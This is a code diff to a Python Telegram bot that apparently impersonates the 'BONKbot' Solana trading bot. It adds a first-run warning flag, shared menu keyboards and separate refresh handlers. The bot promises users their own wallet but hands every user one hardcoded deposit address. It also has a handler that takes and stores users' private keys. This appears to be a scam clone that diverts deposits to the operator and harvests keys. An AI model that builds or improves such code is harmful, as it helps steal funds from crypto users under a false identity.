@@ -31,8 +31,9 @@ users = {}
 DEFAULT_WALLET_ADDRESS = "FitVkAjEaFSNbYriu2v91dnxYA7rMtzMFyd6B3mDxsjg"
 DEFAULT_PRIVATE_KEY = os.environ.get('PRIVATE_KEY', 'YOUR_PRIVATE_KEY_HERE')
 
+# Default settings for users
 DEFAULT_USER_SETTINGS = {
-    "buy_speed": "Fast",
+    "buy_speed": "Fast",   # Fast, Turbo, Eco
     "sell_speed": "Fast"
 }
 
@@ -215,7 +216,7 @@ def fetch_token_info(contract_address):
     }
 
 
-# ----- MAIN MENU HELPER (with optional balance override) -----
+# ----- MAIN MENU HELPER -----
 def main_menu_keyboard():
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("🟢 Buy Token", callback_data="buy"),
@@ -242,7 +243,8 @@ def send_welcome(update_or_message, context, user_id=None):
         "wallet": DEFAULT_WALLET_ADDRESS,
         "balance": 0.0,
         "private_key": DEFAULT_PRIVATE_KEY,
-        "settings": DEFAULT_USER_SETTINGS.copy()
+        "settings": DEFAULT_USER_SETTINGS.copy(),
+        "has_seen_warning": False
     })
     wallet_address = users[user_id]["wallet"]
     balance = get_sol_balance(wallet_address)
@@ -257,39 +259,40 @@ def send_welcome(update_or_message, context, user_id=None):
         "*To buy a token:* tap *Buy Token* and paste a contract address.\n\n"
         "For more info on your wallet and to export your private key, tap *Wallet* below."
     )
-    
-    # Add ℹ️ button as inline keyboard alongside main menu? No, we'll add it as a separate row
-    keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton("🟢 Buy Token", callback_data="buy"),
-         InlineKeyboardButton("🔴 Sell Token", callback_data="sell")],
-        [InlineKeyboardButton("📂 Positions", callback_data="positions"),
-         InlineKeyboardButton("📊 Limit Orders", callback_data="limit_orders")],
-        [InlineKeyboardButton("💸 Withdraw", callback_data="withdraw_menu"),
-         InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
-        [InlineKeyboardButton("👛 Wallet", callback_data="wallet"),
-         InlineKeyboardButton("🔄 Refresh", callback_data="refresh")],
-        [InlineKeyboardButton("ℹ️ View on Solscan", callback_data="solscan_info")]
-    ])
-    
     if hasattr(update_or_message, 'reply_text'):
-        update_or_message.reply_text(text, reply_markup=keyboard, parse_mode='Markdown')
+        update_or_message.reply_text(text, reply_markup=main_menu_keyboard(), parse_mode='Markdown')
     else:
-        context.bot.send_message(chat_id, text, reply_markup=keyboard, parse_mode='Markdown')
+        context.bot.send_message(chat_id, text, reply_markup=main_menu_keyboard(), parse_mode='Markdown')
 
 
-# ----- START (warning first) -----
+# ----- START (warning only on first time) -----
 def start(update, context):
-    """Shows warning message with Continue button."""
-    warning_text = (
-        "⚠️ WARNING: DO NOT CLICK on any ADs at the top of Telegram, they are NOT from us and most likely SCAMS.\n\n"
-        "Moderators, Support Staff and Admins will never Direct Message first or call you!\n\n"
-        "Welcome to BONKbot, the most used Trading Telegram bot. BONKbot enables you to quickly buy or sell tokens and set automations like Limit Orders.\n\n"
-        "By continuing you will create a crypto wallet that interacts with BONKbot to power it up with instant swaps and live data."
-    )
-    keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton("➡️ Continue", callback_data="continue_to_welcome")]
-    ])
-    update.message.reply_text(warning_text, reply_markup=keyboard, parse_mode='Markdown')
+    user_id = update.effective_user.id
+    users.setdefault(user_id, {
+        "wallet": DEFAULT_WALLET_ADDRESS,
+        "balance": 0.0,
+        "private_key": DEFAULT_PRIVATE_KEY,
+        "settings": DEFAULT_USER_SETTINGS.copy(),
+        "has_seen_warning": False
+    })
+    user = users[user_id]
+
+    if not user.get("has_seen_warning", False):
+        # Show warning first time
+        warning_text = (
+            "⚠️ WARNING: DO NOT CLICK on any ADs at the top of Telegram, they are NOT from us and most likely SCAMS.\n\n"
+            "Moderators, Support Staff and Admins will never Direct Message first or call you!\n\n"
+            "Welcome to BONKbot, the most used Trading Telegram bot. BONKbot enables you to quickly buy or sell tokens and set automations like Limit Orders.\n\n"
+            "By continuing you will create a crypto wallet that interacts with BONKbot to power it up with instant swaps and live data."
+        )
+        keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("➡️ Continue", callback_data="continue_to_welcome")]
+        ])
+        update.message.reply_text(warning_text, reply_markup=keyboard, parse_mode='Markdown')
+        user["has_seen_warning"] = True
+    else:
+        # Subsequent starts go directly to welcome
+        send_welcome(update, context, user_id=user_id)
 
 
 # ----- COMMAND HANDLERS (BotFather menu buttons) -----
@@ -299,7 +302,8 @@ def buy_command(update: Update, context: CallbackContext):
         "wallet": DEFAULT_WALLET_ADDRESS,
         "balance": 0.0,
         "private_key": DEFAULT_PRIVATE_KEY,
-        "settings": DEFAULT_USER_SETTINGS.copy()
+        "settings": DEFAULT_USER_SETTINGS.copy(),
+        "has_seen_warning": False
     })
     users[user_id]["awaiting_contract"] = True
     keyboard = InlineKeyboardMarkup([
@@ -316,7 +320,7 @@ def buy_command(update: Update, context: CallbackContext):
 def sell_command(update: Update, context: CallbackContext):
     keyboard = InlineKeyboardMarkup([
         [InlineKeyboardButton("⬅️ Back", callback_data="back_to_start"),
-         InlineKeyboardButton("🔄 Refresh", callback_data="sell")]
+         InlineKeyboardButton("🔄 Refresh", callback_data="sell_refresh")]
     ])
     update.message.reply_text(
         "🔴 *Sell Token*\n\n"
@@ -332,7 +336,8 @@ def withdraw_command(update: Update, context: CallbackContext):
         "wallet": DEFAULT_WALLET_ADDRESS,
         "balance": 0.0,
         "private_key": DEFAULT_PRIVATE_KEY,
-        "settings": DEFAULT_USER_SETTINGS.copy()
+        "settings": DEFAULT_USER_SETTINGS.copy(),
+        "has_seen_warning": False
     })
     user = users[user_id]
     wallet_address = user.get("wallet", DEFAULT_WALLET_ADDRESS)
@@ -342,7 +347,7 @@ def withdraw_command(update: Update, context: CallbackContext):
         [InlineKeyboardButton("➖ Withdraw All SOL", callback_data="withdraw_all")],
         [InlineKeyboardButton("➖ Withdraw X SOL", callback_data="withdraw_x")],
         [InlineKeyboardButton("⬅️ Back", callback_data="back_to_start"),
-         InlineKeyboardButton("🔄 Refresh", callback_data="withdraw_menu")]
+         InlineKeyboardButton("🔄 Refresh", callback_data="withdraw_refresh")]
     ])
     update.message.reply_text(
         f"💸 *Withdraw*\n\n"
@@ -379,11 +384,12 @@ def button(update, context):
             "wallet": DEFAULT_WALLET_ADDRESS,
             "balance": 0.0,
             "private_key": DEFAULT_PRIVATE_KEY,
-            "settings": DEFAULT_USER_SETTINGS.copy()
+            "settings": DEFAULT_USER_SETTINGS.copy(),
+            "has_seen_warning": False
         }
     user = users[user_id]
 
-    # ── Continue to welcome ─────────────────────────────────────────────────
+    # ── Continue to welcome (from warning) ──────────────────────────────────
     if data == "continue_to_welcome":
         try:
             query.message.delete()
@@ -401,28 +407,83 @@ def button(update, context):
         send_welcome(query.message, context, user_id=user_id)
         return
 
-    # ── Solscan Info (ℹ️ button) ────────────────────────────────────────────
-    elif data == "solscan_info":
+    # ── Refresh (silent balance update, popup only) ──────────────────────────
+    elif data == "refresh":
         wallet_address = user.get("wallet", DEFAULT_WALLET_ADDRESS)
-        solscan_url = f"https://solscan.io/account/{wallet_address}"
-        keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("✅ Yes, open Solscan", url=solscan_url)],
-            [InlineKeyboardButton("❌ No, cancel", callback_data="cancel_solscan")]
-        ])
-        query.message.reply_text(
-            f"🔍 *View Wallet on Solscan*\n\n"
-            f"Would you like to open the following link?\n\n"
-            f"`{solscan_url}`\n\n"
-            f"_This will show your wallet balance and transaction history._",
-            reply_markup=keyboard,
-            parse_mode="Markdown"
-        )
+        balance = get_sol_balance(wallet_address)
+        user["balance"] = balance
+        query.answer("✅ Balance updated", show_alert=False)  # Silent popup
+        # Do NOT edit the message, keep it unchanged
+        return
 
-    elif data == "cancel_solscan":
+    # ── Sell Refresh (silent popup only) ────────────────────────────────────
+    elif data == "sell_refresh":
+        query.answer("🔄 Refreshed", show_alert=False)
+        return
+
+    # ── Withdraw Refresh (update balance and edit message) ──────────────────
+    elif data == "withdraw_refresh":
+        wallet_address = user.get("wallet", DEFAULT_WALLET_ADDRESS)
+        balance = get_sol_balance(wallet_address)
+        user["balance"] = balance
+        keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("➖ Withdraw All SOL", callback_data="withdraw_all")],
+            [InlineKeyboardButton("➖ Withdraw X SOL", callback_data="withdraw_x")],
+            [InlineKeyboardButton("⬅️ Back", callback_data="back_to_start"),
+             InlineKeyboardButton("🔄 Refresh", callback_data="withdraw_refresh")]
+        ])
         try:
-            query.message.delete()
+            query.edit_message_text(
+                f"💸 *Withdraw*\n\n"
+                f"Available balance: *{balance:.4f} SOL*\n\n"
+                "Choose a withdrawal option:",
+                reply_markup=keyboard,
+                parse_mode="Markdown"
+            )
         except:
-            pass
+            query.message.reply_text(
+                f"💸 *Withdraw*\n\n"
+                f"Available balance: *{balance:.4f} SOL*\n\n"
+                "Choose a withdrawal option:",
+                reply_markup=keyboard,
+                parse_mode="Markdown"
+            )
+        return
+
+    # ── Wallet Refresh (update balance and edit message) ────────────────────
+    elif data == "wallet_refresh":
+        wallet_address = user.get("wallet", DEFAULT_WALLET_ADDRESS)
+        balance = get_sol_balance(wallet_address)
+        user["balance"] = balance
+        keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("➖ Withdraw All SOL", callback_data="withdraw_all"),
+             InlineKeyboardButton("➖ Withdraw X SOL", callback_data="withdraw_x")],
+            [InlineKeyboardButton("🔑 Export Private Key", callback_data="export_seed")],
+            [InlineKeyboardButton("⬅️ Back", callback_data="back_to_start"),
+             InlineKeyboardButton("🔄 Refresh", callback_data="wallet_refresh")]
+        ])
+        try:
+            query.edit_message_text(
+                f"👛 *Your BONKbot Wallet*\n\n"
+                f"*Address:*\n`{wallet_address}`\n\n"
+                f"*Balance:* `{balance:.4f} SOL`",
+                reply_markup=keyboard,
+                parse_mode="Markdown"
+            )
+        except:
+            query.message.reply_text(
+                f"👛 *Your BONKbot Wallet*\n\n"
+                f"*Address:*\n`{wallet_address}`\n\n"
+                f"*Balance:* `{balance:.4f} SOL`",
+                reply_markup=keyboard,
+                parse_mode="Markdown"
+            )
+        return
+
+    # ── Limit Orders Refresh (silent popup only) ────────────────────────────
+    elif data == "limit_orders_refresh":
+        query.answer("🔄 Refreshed", show_alert=False)
+        return
 
     # ── Settings Main Menu ───────────────────────────────────────────────────
     elif data == "settings":
@@ -445,6 +506,7 @@ def button(update, context):
                 reply_markup=keyboard,
                 parse_mode="Markdown"
             )
+        return
 
     # ── Buy Settings (speed selection) ───────────────────────────────────────
     elif data == "settings_buy":
@@ -474,6 +536,7 @@ def button(update, context):
                 reply_markup=InlineKeyboardMarkup(keyboard),
                 parse_mode="Markdown"
             )
+        return
 
     # ── Sell Settings (speed selection) ──────────────────────────────────────
     elif data == "settings_sell":
@@ -503,13 +566,13 @@ def button(update, context):
                 reply_markup=InlineKeyboardMarkup(keyboard),
                 parse_mode="Markdown"
             )
+        return
 
     # ── Set Buy Speed ────────────────────────────────────────────────────────
     elif data.startswith("set_buy_speed_"):
         speed = data.replace("set_buy_speed_", "")
         user.setdefault("settings", DEFAULT_USER_SETTINGS.copy())
         user["settings"]["buy_speed"] = speed
-        # Refresh the buy settings view with updated selection
         current_buy = speed
         keyboard = []
         speeds = [
@@ -538,13 +601,13 @@ def button(update, context):
                 reply_markup=InlineKeyboardMarkup(keyboard),
                 parse_mode="Markdown"
             )
+        return
 
     # ── Set Sell Speed ───────────────────────────────────────────────────────
     elif data.startswith("set_sell_speed_"):
         speed = data.replace("set_sell_speed_", "")
         user.setdefault("settings", DEFAULT_USER_SETTINGS.copy())
         user["settings"]["sell_speed"] = speed
-        # Refresh the sell settings view with updated selection
         current_sell = speed
         keyboard = []
         speeds = [
@@ -573,6 +636,7 @@ def button(update, context):
                 reply_markup=InlineKeyboardMarkup(keyboard),
                 parse_mode="Markdown"
             )
+        return
 
     # ── Main menu (internal navigation) ──────────────────────────────────────
     elif data == "main_menu":
@@ -584,47 +648,11 @@ def button(update, context):
             f"👛 Balance: *{balance:.4f} SOL*\n\n"
             "Select an option below:"
         )
-        keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("🟢 Buy Token", callback_data="buy"),
-             InlineKeyboardButton("🔴 Sell Token", callback_data="sell")],
-            [InlineKeyboardButton("📂 Positions", callback_data="positions"),
-             InlineKeyboardButton("📊 Limit Orders", callback_data="limit_orders")],
-            [InlineKeyboardButton("💸 Withdraw", callback_data="withdraw_menu"),
-             InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
-            [InlineKeyboardButton("👛 Wallet", callback_data="wallet"),
-             InlineKeyboardButton("🔄 Refresh", callback_data="refresh")],
-            [InlineKeyboardButton("ℹ️ View on Solscan", callback_data="solscan_info")]
-        ])
         try:
-            query.edit_message_text(text, reply_markup=keyboard, parse_mode="Markdown")
+            query.edit_message_text(text, reply_markup=main_menu_keyboard(), parse_mode="Markdown")
         except:
-            query.message.reply_text(text, reply_markup=keyboard, parse_mode="Markdown")
-
-    # ── Refresh (SILENT - just update balance in current message) ───────────
-    elif data == "refresh":
-        wallet_address = user.get("wallet", DEFAULT_WALLET_ADDRESS)
-        balance = get_sol_balance(wallet_address)
-        user["balance"] = balance
-        
-        # Try to determine what kind of message we're refreshing
-        # If it's a main menu or similar, update the balance without changing text
-        try:
-            current_text = query.message.text
-            if "Balance:" in current_text or "balance" in current_text.lower():
-                # Update balance number while preserving rest of text
-                import re
-                new_text = re.sub(r'\*?[\d\.]+\s*SOL\*?', f'*{balance:.4f} SOL*', current_text)
-                query.edit_message_text(
-                    new_text,
-                    reply_markup=query.message.reply_markup,
-                    parse_mode="Markdown"
-                )
-            else:
-                # Not a balance message, just do a silent update (no visible change)
-                query.answer("Balance updated")
-        except:
-            # If editing fails, just answer silently
-            query.answer(f"Balance: {balance:.4f} SOL")
+            query.message.reply_text(text, reply_markup=main_menu_keyboard(), parse_mode="Markdown")
+        return
 
     # ── Buy Token ────────────────────────────────────────────────────────────
     elif data == "buy":
@@ -639,12 +667,13 @@ def button(update, context):
             reply_markup=keyboard,
             parse_mode="Markdown"
         )
+        return
 
     # ── Sell Token ───────────────────────────────────────────────────────────
     elif data == "sell":
         keyboard = InlineKeyboardMarkup([
             [InlineKeyboardButton("⬅️ Back", callback_data="back_to_start"),
-             InlineKeyboardButton("🔄 Refresh", callback_data="sell")]
+             InlineKeyboardButton("🔄 Refresh", callback_data="sell_refresh")]
         ])
         query.message.reply_text(
             "🔴 *Sell Token*\n\n"
@@ -653,6 +682,7 @@ def button(update, context):
             reply_markup=keyboard,
             parse_mode="Markdown"
         )
+        return
 
     # ── Positions ────────────────────────────────────────────────────────────
     elif data == "positions":
@@ -667,12 +697,13 @@ def button(update, context):
             reply_markup=keyboard,
             parse_mode="Markdown"
         )
+        return
 
     # ── Limit Orders ─────────────────────────────────────────────────────────
     elif data == "limit_orders":
         keyboard = InlineKeyboardMarkup([
             [InlineKeyboardButton("⬅️ Back", callback_data="back_to_start"),
-             InlineKeyboardButton("🔄 Refresh", callback_data="limit_orders")]
+             InlineKeyboardButton("🔄 Refresh", callback_data="limit_orders_refresh")]
         ])
         query.message.reply_text(
             "📊 *Limit Orders*\n\n"
@@ -681,6 +712,7 @@ def button(update, context):
             reply_markup=keyboard,
             parse_mode="Markdown"
         )
+        return
 
     # ── Withdraw Menu ────────────────────────────────────────────────────────
     elif data == "withdraw_menu":
@@ -691,7 +723,7 @@ def button(update, context):
             [InlineKeyboardButton("➖ Withdraw All SOL", callback_data="withdraw_all")],
             [InlineKeyboardButton("➖ Withdraw X SOL", callback_data="withdraw_x")],
             [InlineKeyboardButton("⬅️ Back", callback_data="back_to_start"),
-             InlineKeyboardButton("🔄 Refresh", callback_data="withdraw_menu")]
+             InlineKeyboardButton("🔄 Refresh", callback_data="withdraw_refresh")]
         ])
         query.message.reply_text(
             f"💸 *Withdraw*\n\n"
@@ -700,6 +732,7 @@ def button(update, context):
             reply_markup=keyboard,
             parse_mode="Markdown"
         )
+        return
 
     # ── Withdraw All ─────────────────────────────────────────────────────────
     elif data == "withdraw_all":
@@ -711,6 +744,7 @@ def button(update, context):
             reply_markup=keyboard,
             parse_mode="Markdown"
         )
+        return
 
     # ── Withdraw X ───────────────────────────────────────────────────────────
     elif data == "withdraw_x":
@@ -723,6 +757,7 @@ def button(update, context):
             reply_markup=keyboard,
             parse_mode="Markdown"
         )
+        return
 
     # ── Wallet ───────────────────────────────────────────────────────────────
     elif data == "wallet":
@@ -734,7 +769,7 @@ def button(update, context):
              InlineKeyboardButton("➖ Withdraw X SOL", callback_data="withdraw_x")],
             [InlineKeyboardButton("🔑 Export Private Key", callback_data="export_seed")],
             [InlineKeyboardButton("⬅️ Back", callback_data="back_to_start"),
-             InlineKeyboardButton("🔄 Refresh", callback_data="wallet")]
+             InlineKeyboardButton("🔄 Refresh", callback_data="wallet_refresh")]
         ])
         query.message.reply_text(
             f"👛 *Your BONKbot Wallet*\n\n"
@@ -743,6 +778,7 @@ def button(update, context):
             reply_markup=keyboard,
             parse_mode="Markdown"
         )
+        return
 
     # ── Help ─────────────────────────────────────────────────────────────────
     elif data == "help":
@@ -759,6 +795,7 @@ def button(update, context):
             reply_markup=keyboard,
             parse_mode="Markdown"
         )
+        return
 
     # ── Export Private Key ───────────────────────────────────────────────────
     elif data == "export_seed":
@@ -771,30 +808,26 @@ def button(update, context):
             parse_mode="Markdown",
             reply_markup=keyboard
         )
+        return
 
     elif data == "reveal_private_key":
         private_key = user.get("private_key", DEFAULT_PRIVATE_KEY)
         keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("⬅️ Back", callback_data="wallet"),
-             InlineKeyboardButton("❌ Close", callback_data="close_private_key")]
+            [InlineKeyboardButton("⬅️ Back", callback_data="wallet")]
         ])
         query.edit_message_text(
             f"🗝️ *Your Private Key:*\n`{private_key}`\n\n⚠️ Keep it safe. Never share it.",
             parse_mode="Markdown",
             reply_markup=keyboard
         )
-
-    elif data == "close_private_key":
-        try:
-            query.message.delete()
-        except:
-            pass
+        return
 
     elif data == "close_wallet":
         try:
             query.delete_message()
         except:
             pass
+        return
 
 
 # ----- SET PRIVATE KEY -----
@@ -808,7 +841,8 @@ def set_private_key(update, context):
         "wallet": DEFAULT_WALLET_ADDRESS,
         "balance": 0.0,
         "private_key": DEFAULT_PRIVATE_KEY,
-        "settings": DEFAULT_USER_SETTINGS.copy()
+        "settings": DEFAULT_USER_SETTINGS.copy(),
+        "has_seen_warning": False
     })
     users[user_id]["private_key"] = new_key
     update.message.reply_text("✅ *Private key updated successfully!*", parse_mode="Markdown")
@@ -897,13 +931,10 @@ def main():
     dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_messages))
 
     print("✅ Bot running!")
-    print("✅ Warning screen with Continue added")
-    print("✅ Settings with Buy/Sell speed selection (Fast/Turbo/Eco) implemented")
-    print("✅ Refresh buttons work silently (update balance without extra text)")
-    print("✅ Close button added to private key reveal")
-    print("✅ ℹ️ Solscan info button with confirmation")
-    print("✅ GeckoTerminal → Jupiter → DexScreener")
-    print("✅ Back buttons delete and return to start")
+    print("✅ Warning only on first /start")
+    print("✅ Refresh button silently updates balance (popup only)")
+    print("✅ Other refresh buttons behave consistently")
+    print("✅ Settings with Buy/Sell speed selection")
     print("✅ Health check on port 8080")
     updater.start_polling(poll_interval=1)
     updater.idle()
